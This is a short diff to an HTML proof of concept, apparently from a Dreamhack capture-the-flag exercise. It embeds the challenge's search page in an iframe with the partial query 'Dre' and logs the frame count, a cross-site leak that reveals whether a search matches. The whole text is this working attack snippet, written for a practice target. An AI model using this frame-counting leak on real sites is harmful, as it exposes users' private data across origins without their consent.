@@ -1,7 +1,9 @@
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<head><meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"></head>
+<body>
 <script>
 var a=document.createElement("iframe")
 a.src="http://host3.dreamhack.games:20736/search?query=Dre"
-document.head.appendChild(a)
+document.body.appendChild(a)
 a.onload=function(){(console.log(a.contentWindow.frames.length))}
 </script>
+</body>
